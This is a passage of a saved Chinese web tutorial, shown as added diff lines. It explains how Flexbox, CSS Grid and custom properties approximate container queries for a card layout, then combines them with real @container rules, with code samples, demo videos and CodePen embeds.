+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">overflow</span></span></span><span class="rule">:<span class="value"><span class="value"> hidden;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card__button</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inline-flex;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-content</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-items</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">border</span></span></span><span class="rule">:<span class="value"><span class="value"> none;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">border-radius</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>rem;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">background-color</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="hexcolor"><span class="hexcolor">#feca53</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">padding</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px <span class="number"><span class="number">20</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">color</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="hexcolor"><span class="hexcolor">#000</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">text-decoration</span></span></span><span class="rule">:<span class="value"><span class="value"> none;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">box-shadow</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">3</span></span>px <span class="number"><span class="number">8</span></span>px <span class="function"><span class="function">rgb(<span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span> / <span class="number"><span class="number">7</span></span>%)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">transition</span></span></span><span class="rule">:<span class="value"><span class="value"> all <span class="number"><span class="number">0.2</span></span>s linear;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-weight</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">700</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> end;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">20</span></span>px <span class="number"><span class="number">20</span></span>px <span class="number"><span class="number">0</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">cursor</span></span></span><span class="rule">:<span class="value"><span class="value"> pointer;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>你看到的卡片效果如下图所示：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-5.jpg" alt=""></p>
+
+<p>为了能更好的实时调整卡片容器（<code>.container</code>）的宽度，示例中使用简单几行 JavaScript 脚本来动态调整 <a href="https://www.w3cplus.com/blog/tags/601.html" target="_blank">CSS 自定义属性</a> <code>--width</code> 的值，并且使用<code>%</code>单位，容器<code>.container</code> 根据其父元素宽度来动态计算：</p>
+
+<pre class="cs"><code class="cs">.container {
+    inline-size: <span class="keyword"><span class="keyword">var</span></span>(--width, <span class="number"><span class="number">50</span></span>%);
+}
+
+<span class="keyword"><span class="keyword">const</span></span> rootEle = document.documentElement;
+<span class="keyword"><span class="keyword">const</span></span> range = document.getElementById(<span class="string"><span class="string">"width"</span></span>);
+<span class="keyword"><span class="keyword">const</span></span> output = document.getElementById(<span class="string"><span class="string">"output"</span></span>);
+
+range.addEventListener(<span class="string"><span class="string">"change"</span></span>, (etv) =&gt; {
+    rootEle.style.setProperty(<span class="string"><span class="string">"--width"</span></span>, `${etv.target.<span class="keyword"><span class="keyword">value</span></span>}%`);
+    output.textContent = `${etv.target.<span class="keyword"><span class="keyword">value</span></span>}%`;
+});
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-6.jpg">
+    <source src="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-6.mp4" type="video/mp4">
+</video>
+</div>
+
+<blockquote>
+  <p>如果你从未接触过 CSS 自定义属性且对这方面特性感兴趣，<a href="https://www.w3cplus.com/blog/tags/601.html" target="_blank">那么可以点击这里阅读小站上关于 CSS 自定义属性相关的教程</a>。</p>
+</blockquote>
+
+<h3 class="content-title" data-index="3">使用 Flexbox 的容器查询解决方案</h3>
+
+<p>我们先来看看使用 Flexbox 如何实现类似容器查询的效果。</p>
+
+<p>时至今日，Flexbox已是主流布局了。我们显式在卡片容器<code>.container</code>设置<code>display</code>的值为<code>flex</code>或<code>inline-flex</code>，就创建了一个Flexbox上下文（FFC）：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> flex;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>这个时候，Flex项目（<code>.card</code>）会根据Flexbox容器可用空间自动分配空间，当Flexbox容器可以用空间不足以容纳Flex项目时，会溢出Flexbox容器：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-7.jpg">
+    <source src="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-7.mp4" type="video/mp4">
+</video>
+</div>
+
+<p>你可能会想到在Flexbox容器上显式设置<code>flex-wrap: wrap</code>，在Flexbox容器可用空间不足时让Flex项目换行排列。</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> flex;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex-wrap</span></span></span><span class="rule">:<span class="value"><span class="value"> wrap;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>但事实上，并非如你所期待的那样。在Flexbox容器上显式设置<code>flex-wrap: wrap</code>时，表示Flex项目换行显示。在Flex项目未显示设置卡片宽度时，Flex项目会以<code>100%</code>来解析Flex项目，这个时候，不管Flexbox容器大小是多少，你所看到的是每行一个Flex项目（卡片）：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-8.jpg" alt=""></p>
+
+<p>可以在Flex项目上显式设置<code>flex-basis</code>来改变这一现象：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> &gt; <span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex-basis</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">260</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>上面的代码设置了Flex项目（卡片）的初始宽度，即 <code>260px</code>。这个时候，不管Flexbox容器宽度如何调整，Flex项目的宽度都会是 <code>260px</code>。但前面碰到的问题依旧存，Flex项目并不会根据Flexbox容器剩余空间自动扩展或收缩。</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-9.jpg" alt=""></p>
+
+<p>在 Flexbox 布局中，一般使用下面的规则来决定 Flex 项目的尺寸：</p>
+
+<blockquote>
+  <p><strong>首先根据 <code>content</code>  ➜ <code>width</code>  ➜ <code>flex-basis</code> 来决定用哪个来决定用于Flex项目。如果Flex项目显式设置了 <code>flex-basis</code> 属性，则会忽略 <code>content</code> 和 <code>width</code> 。而且 <code>min-width</code> 是用来设置Flex项目的下限值； <code>max-width</code> 是用来设置Flex项目的上限值</strong>。</p>
+</blockquote>
+
+<p>用一个简单的流程图来描述：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/flex-55.png" alt=""></p>
+
+<p>不过，我们希望卡片组件是灵活的，可以扩展和收缩。然而，我只想让这些 Flex 项目（卡片组件）的宽度占Flexbox容器宽度的 <code>33.333%</code> 或 <code>100%</code>。即 Flex项目的宽度不会小于 <code>33.333%</code>或大于<code>100%</code>。</p>
+
+<p>在 Flexbox 布局中，可以在Flex项目上显式设置<code>flex-grow: 1</code>确保该列将在算法和其他属性值允许的范围内填充尽可能多的空间：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> &gt; <span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex-basis</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">33.333</span></span>%;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex-grow</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>上面的代码致使Flexbox有剩余空间时，Flex项目可以基于<code>flex-basis</code>的值增长。</p>
+
+<blockquote>
+  <p>注意，Flexbox布局中<code>flex-grow</code>、<code>flex-shrink</code>和<code>flex-basis</code>，即 Flex项目的计算是件非常复杂的事情。如果你对这方面的知识感兴趣的话，可以阅读《<a href="https://www.w3cplus.com/css/unknown-details-of-the-flexbox-layout.html" target="_blank">Flexbox布局中不为人知的细节</a>》、《<a href="https://www.w3cplus.com/css/the-difference-between-width-and-flex-basis.html" target="_blank">你真的了解CSS的 <code>flex-basis</code> 吗？</a>》和《<a href="https://www.w3cplus.com/css/flex-item-calculate.html" target="_blank">聊聊Flexbox布局中的 <code>flex</code> 的演算法</a>》。文章中详细介绍了 Flex 项目的计算以及相关的算法。</p>
+</blockquote>
+
+<p>这个时候，你将看到的效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-10.jpg">
+    <source src="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-10.mp4" type="video/mp4">
+</video>
+</div>
+
+<p>虽然 Flex 项目能自动扩展，填充Flexbox容器，但离我们的目标效果还是有点远的。不过，不用担心，我们是有办法解决的。先来看 @Heydon Pickering 提出的方法，他把该方法称为 <a rel="nofollow" href="https://heydonworks.com/article/the-flexbox-holy-albatross-reincarnated/" target="_blank"><strong>Flexbox信天翁</strong></a>（"Flexbox Albatross"）。就是在 <code>flex-basis</code> 上使用 <code>calc()</code> 做一些计算。比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> &gt; <span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex-grow</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex-basis</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">calc((<span class="number"><span class="number">35</span></span>rem - <span class="number"><span class="number">100</span></span>%)</span></span> * <span class="number"><span class="number">999</span></span>);</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>关键是在所需的点上进行这种转换。这里把这个点定在 <code>35rem</code>。<code>calc((35rem - 100%) * 999)</code> 所起的作用是 <strong>在低于<code>35rem</code>的情况下，Flex项目（卡片组件）将被放在同一行；在<code>35rem</code>以上时，它们将各自拥有自己的一行（Flex项目宽度扩展到<code>100%</code>）</strong>。其原理是，如果 <code>flex-basis</code> 的值高得离谱，比如 <code>999rem</code>，宽度将是 <code>100%</code>；如果它的值低得离谱，比如 <code>-999rem</code>，它将默认为 <code>33.3333%</code>。</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-11.png" alt=""></p>
+
+<p>这样就达到我们所要的效果：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-12.jpg" alt=""></p>
+
+<p>最终效果如下：</p>
+
+<div style="margin-bottom: 20px;">
+<iframe height="600" style="width: 100%;" scrolling="no" title="Untitled" src="./现代Web技术让我们离容器查询更近一步_files/NWvERQj(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/NWvERQj">
+  Untitled</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>拖动示例中滑块，改变Flexbox容器宽度，看到的效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-13.jpg">
+    <source src="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-13.mp4" type="video/mp4">
+</video>
+</div>
+
+<h3 class="content-title" data-index="3">使用 Grid 的容器查询解决方案</h3>
+
+<p><a href="https://www.w3cplus.com/blog/tags/356.html" target="_blank">CSS Grid</a> 要比 Flexbox 更为魔性，在不依赖 CSS 媒体查询特性，<a href="https://www.w3cplus.com/css/auto-fill-and-auto-fit-in-css-grid.html" target="_blank">只使用 CSS Grid 的几个特性</a>，<strong><code>repeat()</code></strong>、<strong><code>minmax()</code></strong>、<strong><code>fr</code></strong>、<strong><code>auto-fit</code></strong>（或 <strong><code>auto-fill</code></strong> ）就可以构建类似下图这样的效果：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-auto-fit-and-auto-fill-1.gif" alt=""></p>
+
+<p>上图的效果也是根据容器宽度来做出布局响应的。回到我们的示例中，只需要下面的代码就可以让卡片布局根据网格容器宽度做出调整：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(auto-fit, minmax(<span class="number"><span class="number">260</span></span>px, <span class="number"><span class="number">1</span></span>fr)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="Container Query Solutions with CSS Grid" src="./现代Web技术让我们离容器查询更近一步_files/RwZqXJm(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/RwZqXJm">
+  Container Query Solutions with CSS Grid</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>拖动示例中滑块改变网格容器宽度，效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-14.jpg">
+    <source src="/sites/default/files/blogs/2021/2111/css-container-queries-flexbox-grid-14.mp4" type="video/mp4">
+</video>
+</div>
+
+<p>简单的解释一下 <code>repeat(auto-fit, minmax(260px, 1fr))</code>。</p>
+
+<ul>
+<li><code>repeat()</code>函数能把定义的列行为应用到所有存在的列，这使得它可以扩展到任何类型的内容所能创建的任何数量的列</li>
+<li><code>auto-fit</code>来替代<code>repeat()</code>函数的是数字参数，它负责确保列保持等宽，通过拉伸列来填补任何可用空间</li>
+<li><code>minmax(min, max)</code>函数来设置允许的最小列宽（<code>min</code>），即示例中的<code>260px</code>和最大列宽（<code>max</code>），即示例中的<code>1fr</code></li>
+<li><code>fr</code>是只存于 CSS Grid中的单位，示例中的<code>1fr</code>表示把网容可用空间分成一等份，相当于<code>100%</code>，确保内容在空间允许的范围内填满该列</li>
+</ul>
+
+<p>在<code>minmax()</code>函数中的<code>min</code>和<code>max</code>值，也可以使用相对单位，比如<code>rem</code>，但在该示例中不要使用<code>%</code>，因为它会阻止列的折叠。还有，示例中<code>minmax()</code>函数中的<code>min</code>值是<code>260px</code>，它表示卡片的最小宽度。</p>
+
+<p>事实上，我们并不知道卡片组件实际尺寸，即它的最小宽度是未知的。按理说，我们可以使用内在尺寸（根据卡片内容来决定大小）<code>min-content</code> 来替代 <code>260px</code>，但不幸的是，到目前为止，<code>min-content</code>是不能用于<code>repeat()</code>函数中。</p>
+
+<blockquote>
+  <p>自动重复（<code>auto-fill</code>或<code>auto-fit</code>）不能与内在尺寸（比如<code>min-content</code>、<code>max-content</code>）或<code>fr</code>为单位尺寸相结合。</p>
+</blockquote>
+
+<p>不过，值得庆幸的是，如果你希望动态调整这个最小尺寸，我们可以使用 <a href="https://www.w3cplus.com/blog/tags/601.html" target="_blank">CSS 的自定义属性</a>，这样只需要简单的几行脚本就可以动态的调整卡片最小宽度。如果换成 CSS 自定义属性，可以像下面这样使用：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--min-card-size</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">260</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(auto-fit, minmax(var(--min-card-size)</span></span>, <span class="number"><span class="number">1</span></span>fr));</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>最后再提一点，使用 CSS 自定义属性，可以让我们离容器查询更进一步，@Mathias Hülsbusch 把这种技术称为 <a rel="nofollow" href="https://css-tricks.com/the-raven-technique-one-step-closer-to-container-queries/" target="_blank"><strong>乌鸦（Raven）技术</strong></a>。但这种技术会让代码变得非常复杂，比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--columns_wide</span></span></span><span class="rule">:<span class="value"><span class="number"><span class="value"><span class="number">5</span></span></span><span class="value">;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--columns_medium</span></span></span><span class="rule">:<span class="value"><span class="number"><span class="value"><span class="number">2</span></span></span><span class="value">;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--columns_small</span></span></span><span class="rule">:<span class="value"><span class="number"><span class="value"><span class="number">1</span></span></span><span class="value">;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--grid-gap</span></span></span><span class="rule">:<span class="value"><span class="number"><span class="value"><span class="number">0.5</span></span></span><span class="value">rem;</span></span></span><span class="value"></span></span>
+
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--grid-width_wide</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">calc((<span class="number"><span class="number">100</span></span>% - (var(--columns_wide)</span></span> - <span class="number"><span class="number">1</span></span>) * <span class="function"><span class="function">var(--grid-gap)</span></span>) / <span class="function"><span class="function">var(--columns_wide)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--grid-width_medium</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">calc((<span class="number"><span class="number">100</span></span>% - (var(--columns_medium)</span></span> - <span class="number"><span class="number">1</span></span>) * <span class="function"><span class="function">var(--grid-gap)</span></span>) / <span class="function"><span class="function">var(--columns_medium)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--grid-width_small</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">calc((<span class="number"><span class="number">100</span></span>% - (var(--columns_small)</span></span> - <span class="number"><span class="number">1</span></span>) * <span class="function"><span class="function">var(--grid-gap)</span></span>) / <span class="function"><span class="function">var(--columns_small)</span></span>);</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--grid-width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">calc(
+        min(var(--is_wide)</span></span> * <span class="function"><span class="function">var(--very_big_int)</span></span>, <span class="function"><span class="function">var(--grid-width_wide)</span></span>) +
+        <span class="function"><span class="function">min(var(--is_medium)</span></span> * <span class="function"><span class="function">var(--very_big_int)</span></span>, <span class="function"><span class="function">var(--grid-width_medium)</span></span>) +
+        <span class="function"><span class="function">min(var(--is_small)</span></span> * <span class="function"><span class="function">var(--very_big_int)</span></span>, <span class="function"><span class="function">var(--grid-width_small)</span></span>)
+    );</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="function"><span class="value"><span class="function">var(--grid-gap)</span></span></span><span class="value">;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(auto-fill, var( --grid-width)</span></span>);</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>试问一下，这样的代码你能看懂吗？就我个人而言，我不建议在实际生产中使用这样的代码，因为它让代码变得复杂难于维护。如果你对这个技术感兴趣的话，可以详细阅读 @Mathias Hülsbusch 的博文《<a rel="nofollow" href="https://css-tricks.com/the-raven-technique-one-step-closer-to-container-queries/" target="_blank">The Raven Technique: One Step Closer to Container Queries</a>》。或者阅读我早期整理的关于<a href="https://www.w3cplus.com/blog/tags/601.html" target="_blank">CSS自定义属性</a>的几篇文章：</p>
+
+<ul>
+<li><a href="https://www.w3cplus.com/css/how-much-do-you-know-about-css-custom-properties.html" target="_blank">CSS自定义属性你知道多少</a></li>
+<li><a href="https://www.w3cplus.com/css/use-cases-and-examples-with-css-custom-property.html" target="_blank">CSS自定义属性的使用实例</a></li>
+<li><a href="https://www.w3cplus.com/css/use-invalid-variables-in-the-css-custom-properties.html" target="_blank">在CSS自定义属性中有效使用无效变量</a></li>
+</ul>
+
+<h2 class="content-title" data-index="2">现代Web技术创建的响应容器存在的缺陷</h2>
+
+<p>虽然现代Web技术，比如前文提到的Flexbox和Grid相关特性让我们离容器查询更近一步，但还是存有一定的缺陷。就拿文章开头提到的目标：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-1.jpg" alt=""></p>
+
+<p>不管我们使用Flexbox还是Grid总是无法达到中间状态的效果：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-15.jpg" alt=""></p>
+
+<p>回顾一下，在Flexbox布局中，我们只能做到：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-16.jpg" alt=""></p>
+
+<p>而在Grid布局中，有的时候最后一个单个的卡片不能填充整个容器宽度，也无法像Flexbox信天翁技术，跳过中间态：</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-17.jpg" alt=""></p>
+
+<p>当然，要是在这两个技术基础上容入媒体查询，是可以改变，但这并不是我们的初衷。简单地说，这就是Flexbox和Grid构建容器查询或内容向应存在的缺陷。</p>
+
+<p>最后，我们再花点时间，把真正的容器查询技术放到 Flexbox和Grid技术中。</p>
+
+<h2 class="content-title" data-index="2">容器查询和现代Web布局技术的融合</h2>
+
+<p>通过前面的《<a href="https://www.w3cplus.com/css/container-queries.html" target="_blank">初探CSS容器查询</a>》和《<a href="https://www.w3cplus.com/css/container-queries-with-container-and-at-container.html" target="_blank">容器查询中的 <code>container</code> 和 @container</a>》介绍的技术，即 <strong>真天的CSS容器查询</strong> 可以帮助我们完成中间状态的布局效果。</p>
+
+<p><img src="./现代Web技术让我们离容器查询更近一步_files/css-container-queries-flexbox-grid-15.jpg" alt=""></p>
+
+<p>我们先来看容器查询放到Flexbox布局中的效果。其中关键代码如下：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--width, <span class="number"><span class="number">50</span></span>%)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">min-width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">320</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0</span></span> auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> flex;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex-wrap</span></span></span><span class="rule">:<span class="value"><span class="value"> wrap;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.container</span></span> &gt; <span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">flex</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> <span class="number"><span class="number">1</span></span> <span class="number"><span class="number">260</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">container</span></span></span><span class="rule">:<span class="value"><span class="value"> inline-size;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="at_rule"><span class="at_rule">@container (min-width: <span class="number"><span class="number">480</span></span>px) and (max-width: <span class="number"><span class="number">768</span></span>px) </span></span>{
+    <span class="class"><span class="class">.card</span></span><span class="pseudo"><span class="pseudo">:last-child</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">240</span></span>px auto;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> min-content min-content auto;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value">
+        <span class="string"><span class="string">"thumbnail title"</span></span>
+        <span class="string"><span class="string">"thumbnail describe"</span></span>
+        <span class="string"><span class="string">"thumbnail button"</span></span>;</span></span></span><span class="value"></span></span>
